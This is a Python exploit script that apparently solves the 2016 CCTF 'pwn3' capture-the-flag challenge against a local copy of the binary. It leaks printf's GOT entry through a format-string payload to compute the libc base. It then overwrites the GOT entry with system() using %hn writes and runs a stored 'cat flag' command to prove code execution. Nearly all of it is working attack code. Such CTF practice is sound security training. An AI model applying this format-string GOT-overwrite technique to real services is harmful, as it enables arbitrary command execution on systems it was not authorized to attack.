#!/usr/bin/env python3
from __future__ import annotations

import os
from pathlib import Path
import select
import struct
import subprocess
import time


CHALLENGE_DIR = Path(".forgeflag/artifacts/pwn-20260702-152927-2016-cctf-pwn3")
BINARY_NAME = "2016-CCTF-pwn3"
TEST_FLAG = "flag{forgeflag_local_pwn3_replay}"
PRINTF_GOT = 0x0804A014
PRINTF_OFFSET = 0x00053F60
SYSTEM_OFFSET = 0x0004C920


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def u32(value: bytes) -> int:
    return struct.unpack("<I", value)[0]


class ProcessTube:
    def __init__(self, binary: Path, cwd: Path) -> None:
        self.process = subprocess.Popen(
            [str(binary)],
            cwd=str(cwd),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

    def read_until(self, token: bytes, timeout: float = 5.0) -> bytes:
        assert self.process.stdout is not None
        data = b""
        deadline = time.time() + timeout
        while token not in data:
            if time.time() > deadline:
                raise TimeoutError(f"missing {token!r}; got {data!r}")
            readable, _, _ = select.select([self.process.stdout], [], [], 0.05)
            if not readable:
                continue
            chunk = os.read(self.process.stdout.fileno(), 4096)
            if not chunk:
                break
            data += chunk
        return data

    def read_available(self, timeout: float = 3.0) -> bytes:
        assert self.process.stdout is not None
        data = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            readable, _, _ = select.select([self.process.stdout], [], [], 0.05)
            if not readable:
                continue
            chunk = os.read(self.process.stdout.fileno(), 4096)
            if not chunk:
                break
            data += chunk
        return data

    def sendline(self, data: bytes | str) -> None:
        assert self.process.stdin is not None
        if isinstance(data, str):
            data = data.encode()
        self.process.stdin.write(data + b"\n")
        self.process.stdin.flush()

    def close(self) -> None:
        self.process.kill()


def put_file(io: ProcessTube, name: bytes, content: bytes) -> None:
    io.sendline(b"put")
    io.read_until(b"upload:")
    io.sendline(name)
    io.read_until(b"content:")
    io.sendline(content)
    io.read_until(b"ftp>")


def get_file(io: ProcessTube, name: bytes) -> bytes:
    io.sendline(b"get")
    io.read_until(b"get:")
    io.sendline(name)
    return io.read_until(b"ftp>")


def get_file_after_overwrite(io: ProcessTube, name: bytes) -> bytes:
    io.sendline(b"get")
    time.sleep(0.2)
    io.sendline(name)
    return io.read_available(timeout=1.0)


def fmtstr_two_hn(target: int, value: int, first_arg_index: int = 7) -> bytes:
    writes = [(target, value & 0xFFFF), (target + 2, (value >> 16) & 0xFFFF)]
    writes.sort(key=lambda item: item[1])
    payload = p32(writes[0][0]) + p32(writes[1][0])
    printed = len(payload)
    for index, (_, half_word) in enumerate(writes, start=first_arg_index):
        delta = (half_word - printed) & 0xFFFF
        if delta:
            payload += f"%{delta}c".encode()
            printed = (printed + delta) & 0xFFFF
        payload += f"%{index}$hn".encode()
    return payload


def main() -> int:
    root = Path.cwd()
    challenge_dir = root / CHALLENGE_DIR
    binary = challenge_dir / BINARY_NAME
    (challenge_dir / "flag").write_text(TEST_FLAG + "\n", encoding="ascii")
    binary.chmod(0o755)

    io = ProcessTube(binary, challenge_dir)
    try:
        io.read_until(b"Name (ftp.hacker.server:Rainism):")
        io.sendline(b"rxraclhm")
        io.read_until(b"welcome!")
        io.read_until(b"ftp>")

        put_file(io, b"cmd", b"cat flag")
        leak_payload = b"AAAA" + p32(PRINTF_GOT) + b".%8$.4s.END"
        put_file(io, b"leak", leak_payload)
        leak_output = get_file(io, b"leak")
        marker = b"AAAA" + p32(PRINTF_GOT) + b"."
        if marker not in leak_output:
            raise RuntimeError(f"leak marker missing: {leak_output!r}")
        printf_addr = u32(leak_output.split(marker, 1)[1][:4])
        libc_base = printf_addr - PRINTF_OFFSET
        system_addr = libc_base + SYSTEM_OFFSET

        overwrite = fmtstr_two_hn(PRINTF_GOT, system_addr)
        put_file(io, b"write", overwrite)
        get_file_after_overwrite(io, b"write")
        final_output = get_file_after_overwrite(io, b"cmd")
        if TEST_FLAG.encode() not in final_output:
            raise RuntimeError(f"flag proof missing: {final_output!r}")

        transcript = b"\n".join(
            [
                b"login ok",
                b"printf leak: " + hex(printf_addr).encode(),
                b"libc base: " + hex(libc_base).encode(),
                b"system: " + hex(system_addr).encode(),
                b"command: cat flag",
                final_output,
            ]
        )
        print(transcript.decode("latin-1", errors="replace"))
        print(f"PROOF_OK {TEST_FLAG}")
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
